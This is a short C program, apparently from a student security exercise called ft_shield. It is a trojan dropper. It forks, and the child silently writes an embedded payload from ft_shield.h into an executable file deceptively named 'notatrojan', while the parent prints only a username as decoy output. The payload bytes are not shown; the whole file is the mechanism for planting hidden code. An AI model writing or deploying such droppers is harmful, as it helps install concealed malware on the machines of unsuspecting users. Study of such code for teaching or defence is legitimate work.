#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <ft_shield.h>

#define NAME "notatrojan"

int main() {
	if (fork() == 0) {
		int fd = open(NAME, O_WRONLY | O_TRUNC | O_CREAT, 0755);
		if (fd >= 0 && strlen((char*)trojan)) {
			write(fd, trojan, trojan_len);
		}
		exit(0);
	} else {
		printf("jcario\n");
	}
}
